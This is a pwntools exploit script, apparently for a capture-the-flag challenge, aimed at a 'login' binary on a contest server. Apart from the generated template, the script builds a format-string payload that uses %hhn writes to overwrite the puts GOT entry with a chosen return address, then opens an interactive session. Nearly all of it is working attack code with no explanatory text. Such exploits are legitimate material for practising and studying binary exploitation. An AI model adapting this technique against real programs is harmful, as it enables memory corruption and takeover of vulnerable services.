#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host chall.ctf.pragyan.org --port 30105 ./login
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./login')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'chall.ctf.pragyan.org'
port = int(args.PORT or 30105)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *0x080494bb
b *0x080494c0
continue
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()

def make_offset(addr, len=1):
    len_format = 2**(len*8)-1
    offset = []

    for i in range(8/len):
       tmp = addr & len_format
       offset.append(tmp)
       addr >>= len_format.bit_length() # bit

    return offset
len = 0xff
ret = 0x08049427
print hex(exe.got['puts'])
off = make_offset(ret,1)

p = '%{}x%24$hhn'.format(off[0])
p += '%{}x%25$hhn'.format(off[1] - off[0] + len + 1)
p += '%{}x%26$hhn'.format(off[2] - off[1] + len + 1)
p += '%{}x%27$hhn'.format(off[3] - off[2] + len + 1)
# p = '%23$p'
p = p.ljust(80, '\xaa')
p += p32(exe.got['puts']) # tujuan
p += p32(exe.got['puts']+1)
p += p32(exe.got['puts']+2)
p += p32(exe.got['puts']+3)
p += 'EOF'
# p = p.ljust(0x100, '\x00')

io.sendline(p)

io.recvuntil("EOF")

io.interactive()
